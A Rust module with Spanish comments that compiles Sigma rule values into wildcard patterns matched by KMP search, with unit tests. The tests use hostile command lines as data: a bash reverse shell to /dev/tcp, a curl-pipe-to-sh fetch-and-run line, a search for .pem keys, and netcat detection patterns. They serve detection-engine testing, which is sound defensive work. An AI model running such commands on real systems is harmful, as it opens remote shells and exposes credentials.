//! El patron de un valor Sigma: literales, comodines `*` y anclas, sin retroceso.
//!
//! # Lo que dice Sigma y lo que se hacia antes
//!
//! En Sigma, un valor sin modificador es una igualdad **con comodines**:
//! `Image: '/tmp/*'` es «empieza por /tmp/». Los modificadores `contains`,
//! `startswith` y `endswith` solo añaden comodines por los lados, y los de dentro
//! del valor siguen siendo comodines. El compilador anterior (en ruleforge)
//! comparaba el `*` como un caracter literal: toda regla con un comodin en el
//! valor compilaba, se contaba como cubierta, y no disparaba jamas.
//!
//! # Como se evalua sin retroceso
//!
//! Un patron con solo `*` es una secuencia de trozos literales. Basta buscar cada
//! trozo, en orden, a partir de donde termino el anterior (la primera aparicion
//! es siempre la mejor eleccion para `*`), con el primero anclado al principio y
//! el ultimo al final si no hay comodin a ese lado. Cada busqueda es KMP: no
//! vuelve atras sobre el texto y su coste es lineal. El `?` (un caracter
//! cualquiera) romperia esa propiedad sin ganar casi nada en reglas de Linux: se
//! rechaza con nombre.

/// Longitud maxima de un trozo literal. Da cabida de sobra a cualquier ruta o
/// linea de comandos de una regla real, y mantiene la tabla de KMP en `u16`.
pub const MAX_TROZO: usize = 4096;

/// Un trozo literal, en minusculas ASCII, con su tabla de fallos de KMP.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Trozo {
    bytes: Box<[u8]>,
    fallos: Box<[u16]>,
}

impl Trozo {
    fn nuevo(literal: &[u8]) -> Trozo {
        let bytes: Box<[u8]> = literal.iter().map(u8::to_ascii_lowercase).collect();
        let mut fallos = vec![0u16; bytes.len()];
        let mut k = 0usize;
        let mut i = 1usize;
        while i < bytes.len() {
            while k > 0 && bytes[i] != bytes[k] {
                k = usize::from(fallos[k - 1]);
            }
            if bytes[i] == bytes[k] {
                k += 1;
            }
            // `k <= i < MAX_TROZO`, que cabe en u16.
            fallos[i] = u16::try_from(k).unwrap_or(u16::MAX);
            i += 1;
        }
        Trozo {
            bytes,
            fallos: fallos.into_boxed_slice(),
        }
    }

    /// Los bytes del trozo, ya en minusculas.
    #[must_use]
    pub fn bytes(&self) -> &[u8] {
        &self.bytes
    }

    /// Busca el trozo en `texto` sin distinguir mayusculas ASCII.
    ///
    /// Devuelve la posicion justo despues de la primera aparicion. KMP: cada
    /// byte del texto se mira una vez hacia delante, y el total de pasos atras
    /// sobre el PATRON esta acotado por la longitud del texto.
    fn buscar(&self, texto: &[u8]) -> Option<usize> {
        let p = &self.bytes;
        if p.is_empty() {
            return Some(0);
        }
        if p.len() > texto.len() {
            return None;
        }
        let mut k = 0usize;
        for (i, b) in texto.iter().enumerate() {
            let b = b.to_ascii_lowercase();
            while k > 0 && b != p[k] {
                k = usize::from(self.fallos[k - 1]);
            }
            if b == p[k] {
                k += 1;
                if k == p.len() {
                    return Some(i + 1);
                }
            }
        }
        None
    }
}

/// Como compara un patron con el valor de un campo.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Anclaje {
    /// El valor entero (igualdad).
    Igual,
    /// En cualquier parte.
    Contiene,
    /// Al principio.
    Empieza,
    /// Al final.
    Acaba,
}

/// Un valor Sigma compilado.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Patron {
    inicio: bool,
    fin: bool,
    trozos: Vec<Trozo>,
}

impl Patron {
    /// Compila un valor con su anclaje.
    ///
    /// Escapes de Sigma: `\*`, `\?` y `\\` son literales; cualquier otra barra
    /// invertida es ella misma (las rutas de Windows del catalogo la usan sin
    /// escapar).
    ///
    /// # Errores
    /// El motivo, en texto, si el valor usa `?`, si un trozo pasa de
    /// [`MAX_TROZO`] o si un `contains`, `startswith` o `endswith` va vacio.
    pub fn nuevo(anclaje: Anclaje, valor: &str) -> Result<Patron, String> {
        let (mut inicio, mut fin) = match anclaje {
            Anclaje::Igual => (true, true),
            Anclaje::Contiene => (false, false),
            Anclaje::Empieza => (true, false),
            Anclaje::Acaba => (false, true),
        };
        if valor.is_empty() && anclaje != Anclaje::Igual {
            // `contains: ''` casaria con todo: no es una deteccion, es un error
            // de quien escribio la regla.
            return Err("un valor vacio con contains, startswith o endswith".to_string());
        }

        let b = valor.as_bytes();
        let mut trozos: Vec<Vec<u8>> = vec![Vec::new()];
        let mut comodin_al_principio = false;
        let mut comodin_al_final = false;
        let mut i = 0usize;
        while i < b.len() {
            match b[i] {
                b'\\' if i + 1 < b.len() && matches!(b[i + 1], b'*' | b'?' | b'\\') => {
                    if let Some(t) = trozos.last_mut() {
                        t.push(b[i + 1]);
                    }
                    i += 2;
                    comodin_al_final = false;
                    continue;
                }
                b'*' => {
                    if i == 0 {
                        comodin_al_principio = true;
                    }
                    comodin_al_final = true;
                    trozos.push(Vec::new());
                }
                b'?' => {
                    return Err(format!(
                        "el comodin «?» en «{valor}»: un caracter cualquiera obliga a \
                         retroceder y no se evalua en el agente"
                    ));
                }
                c => {
                    if let Some(t) = trozos.last_mut() {
                        t.push(c);
                    }
                    comodin_al_final = false;
                }
            }
            i += 1;
        }
        if comodin_al_principio {
            inicio = false;
        }
        if comodin_al_final {
            fin = false;
        }
        let mut compilados = Vec::new();
        for t in trozos.into_iter().filter(|t| !t.is_empty()) {
            if t.len() > MAX_TROZO {
                return Err(format!(
                    "un trozo literal de {} bytes, por encima del tope de {MAX_TROZO}",
                    t.len()
                ));
            }
            compilados.push(Trozo::nuevo(&t));
        }
        Ok(Patron {
            inicio,
            fin,
            trozos: compilados,
        })
    }

    /// Los trozos literales, en orden.
    #[must_use]
    pub fn trozos(&self) -> &[Trozo] {
        &self.trozos
    }

    /// Si esta anclado al principio del valor.
    #[must_use]
    pub fn inicio(&self) -> bool {
        self.inicio
    }

    /// Si esta anclado al final del valor.
    #[must_use]
    pub fn fin(&self) -> bool {
        self.fin
    }

    /// Un valor que casa con el patron: los trozos, en orden, pegados.
    ///
    /// Es lo que usa el generador de eventos de prueba ([`crate::generador`]):
    /// el caso positivo sale de la regla, no de un ejemplo escrito a mano.
    #[must_use]
    pub fn testigo(&self) -> Vec<u8> {
        if self.trozos.is_empty() {
            return if self.inicio && self.fin {
                Vec::new()
            } else {
                b"x".to_vec()
            };
        }
        self.trozos
            .iter()
            .flat_map(|t| t.bytes().iter().copied())
            .collect()
    }

    /// Si el valor de un campo casa con el patron.
    #[must_use]
    pub fn casa(&self, texto: &[u8]) -> bool {
        let trozos = &self.trozos[..];
        if trozos.is_empty() {
            // Solo comodines: casa con cualquier valor presente. Sin comodines
            // (igualdad con ''), solo con el valor vacio.
            return !(self.inicio && self.fin) || texto.is_empty();
        }
        if trozos.len() == 1 && self.inicio && self.fin {
            return texto.eq_ignore_ascii_case(trozos[0].bytes());
        }

        let mut desde = 0usize;
        let mut hasta = texto.len();
        let mut medio = trozos;
        if self.inicio {
            let t = trozos[0].bytes();
            if t.len() > hasta || !texto[..t.len()].eq_ignore_ascii_case(t) {
                return false;
            }
            desde = t.len();
            medio = &trozos[1..];
        }
        if self.fin {
            if let Some((ultimo, resto)) = medio.split_last() {
                let t = ultimo.bytes();
                // `desde <= hasta` siempre: el prefijo cupo dentro del texto.
                if t.len() > hasta - desde || !texto[hasta - t.len()..].eq_ignore_ascii_case(t) {
                    return false;
                }
                hasta -= t.len();
                medio = resto;
            }
        }
        for t in medio {
            match t.buscar(&texto[desde..hasta]) {
                Some(fin_rel) => desde += fin_rel,
                None => return false,
            }
        }
        true
    }

    /// Pasos de comparacion en el peor caso contra un campo de `max_campo`
    /// bytes. Una busqueda KMP cuesta como mucho dos pasos por byte del texto.
    #[must_use]
    pub fn coste(&self, max_campo: usize) -> u64 {
        let mut total = 0u64;
        for (i, t) in self.trozos.iter().enumerate() {
            let anclado = (i == 0 && self.inicio) || (i + 1 == self.trozos.len() && self.fin);
            let pasos = if anclado {
                t.bytes().len()
            } else {
                2 * max_campo + t.bytes().len()
            };
            total = total.saturating_add(u64::try_from(pasos).unwrap_or(u64::MAX));
        }
        total.max(1)
    }
}

#[cfg(test)]
mod pruebas {
    use super::*;

    fn p(a: Anclaje, v: &str) -> Patron {
        Patron::nuevo(a, v).expect("patron valido")
    }

    #[test]
    fn los_cuatro_anclajes_hacen_lo_que_dicen() {
        assert!(p(Anclaje::Igual, "/usr/bin/nc").casa(b"/USR/bin/NC"));
        assert!(!p(Anclaje::Igual, "/usr/bin/nc").casa(b"/usr/bin/ncat"));
        assert!(p(Anclaje::Contiene, "/dev/tcp/").casa(b"bash -i >& /dev/tcp/1.2.3.4/9 0>&1"));
        assert!(p(Anclaje::Empieza, "/tmp/").casa(b"/tmp/x"));
        assert!(!p(Anclaje::Empieza, "/tmp/").casa(b"/var/tmp/x"));
        assert!(p(Anclaje::Acaba, "/nc").casa(b"/usr/bin/nc"));
        assert!(!p(Anclaje::Acaba, "/sh").casa(b"/usr/bin/ssh"));
    }

    /// EL HALLAZGO: un `*` dentro del valor es un comodin, no un caracter. Antes
    /// se comparaba literal y la regla no disparaba nunca.
    #[test]
    fn el_comodin_es_un_comodin_y_no_un_caracter() {
        let q = p(Anclaje::Igual, "/tmp/*");
        assert!(q.casa(b"/tmp/.x/minero"));
        assert!(!q.casa(b"/var/tmp/x"));
        let q = p(Anclaje::Igual, "*curl*|*sh");
        assert!(q.casa(b"bash -c curl -s http://x | sh"));
        assert!(!q.casa(b"bash -c curl -s http://x | tee"));
        let q = p(Anclaje::Contiene, "a*b*c");
        assert!(q.casa(b"xxaxxbxxcxx"));
        assert!(!q.casa(b"xxcxxbxxaxx"), "el orden de los trozos importa");
        assert!(p(Anclaje::Igual, "*").casa(b"lo que sea"));
    }

    #[test]
    fn los_escapes_de_sigma_dan_literales() {
        let q = p(Anclaje::Contiene, "\\*.pem");
        assert!(q.casa(b"find / -name *.pem"));
        assert!(!q.casa(b"find / -name clave.pem"));
        // Una barra que no escapa nada es ella misma (rutas de Windows).
        assert!(p(Anclaje::Acaba, "\\powershell.exe").casa(b"C:\\x\\powershell.exe"));
    }

    /// Prefijo y sufijo no pueden solaparse: `ab*ba` no casa con `aba`.
    #[test]
    fn las_anclas_no_se_solapan() {
        let q = p(Anclaje::Igual, "ab*ba");
        assert!(!q.casa(b"aba"));
        assert!(q.casa(b"abba"));
        assert!(q.casa(b"ab-lo-que-sea-ba"));
    }

    /// EL HALLAZGO de ruleforge: `startswith` cortaba el `&str` por una
    /// posicion que podia caer dentro de un caracter UTF-8, y eso es un panico
    /// provocable por quien elija el nombre de un proceso. Aqui se compara sobre
    /// bytes.
    #[test]
    fn un_valor_con_caracteres_multibyte_no_provoca_panico() {
        for v in ["ñ", "/tmñ", "ññññ/x", "\u{1F600}/tmp/"] {
            let _ = p(Anclaje::Empieza, "/tmp/").casa(v.as_bytes());
            let _ = p(Anclaje::Acaba, "/tmp/").casa(v.as_bytes());
            let _ = p(Anclaje::Igual, "/tm*p/").casa(v.as_bytes());
        }
    }

    #[test]
    fn el_comodin_de_un_caracter_y_los_vacios_se_rechazan() {
        assert!(Patron::nuevo(Anclaje::Igual, "/tmp/?").is_err());
        assert!(Patron::nuevo(Anclaje::Contiene, "").is_err());
        assert!(p(Anclaje::Igual, "").casa(b""));
        assert!(!p(Anclaje::Igual, "").casa(b"x"));
    }

    /// KMP con un patron que obliga a usar la tabla de fallos.
    #[test]
    fn kmp_encuentra_lo_que_una_busqueda_ingenua_encuentra() {
        let casos: &[(&str, &str)] = &[
            ("aabaabaaa", "aabaaa"),
            ("abababca", "ababca"),
            ("aaaaaaaab", "aaab"),
            ("xyz", "xyzz"),
            ("mississippi", "issip"),
        ];
        for (texto, aguja) in casos {
            let esperado = texto.contains(aguja);
            assert_eq!(
                p(Anclaje::Contiene, aguja).casa(texto.as_bytes()),
                esperado,
                "{texto} / {aguja}"
            );
        }
    }

    #[test]
    fn el_testigo_casa_con_su_patron() {
        for (a, v) in [
            (Anclaje::Igual, "alfa"),
            (Anclaje::Igual, "al*fa*"),
            (Anclaje::Igual, "ab*ba"),
            (Anclaje::Contiene, "beta"),
            (Anclaje::Empieza, "/opt/"),
            (Anclaje::Acaba, "/gamma"),
            (Anclaje::Igual, "*"),
            (Anclaje::Igual, ""),
        ] {
            let q = p(a, v);
            assert!(q.casa(&q.testigo()), "{a:?} {v}");
        }
    }

    #[test]
    fn el_coste_crece_con_el_campo_solo_en_las_busquedas() {
        let anclado = p(Anclaje::Acaba, "/nc");
        let buscado = p(Anclaje::Contiene, "/nc");
        assert_eq!(anclado.coste(1024), 3);
        assert_eq!(buscado.coste(1024), 2 * 1024 + 3);
    }
}
